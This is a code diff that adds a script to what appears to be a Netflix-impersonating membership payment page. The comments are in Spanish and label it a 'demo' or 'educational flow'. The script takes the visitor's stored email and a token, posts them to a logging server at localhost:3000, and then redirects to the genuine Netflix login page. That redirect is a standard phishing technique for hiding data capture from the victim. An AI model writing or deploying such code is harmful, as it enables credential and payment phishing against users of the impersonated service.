@@ -69,5 +69,32 @@
         </div>
     </div>
 </body>
+<script>
+  async function enviarDemoYRedirigir() {
+    const email = sessionStorage.getItem('demoEmail') || '';
+    const demoToken = sessionStorage.getItem('demoToken') || '';
+
+    try {
+      await fetch('http://localhost:3000/demo-log', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          email,
+          stage: 'pay',     // etapa del flujo
+          demoToken
+        })
+      });
+    } catch (e) {
+      // Si falla el correo, igual redirigimos (no bloquees la experiencia)
+      console.warn('No se pudo enviar log DEMO:', e);
+    } finally {
+      // Redirección al sitio oficial (flujo educativo completo)
+      window.location.replace('https://www.netflix.com/mx/login');
+    }
+  }
+
+  // Si tu botón tiene un enlace a otra página, cámbialo por onclick:
+  // <button type="button" onclick="enviarDemoYRedirigir()">Iniciar membresía</button>
+</script>
 
 </html>
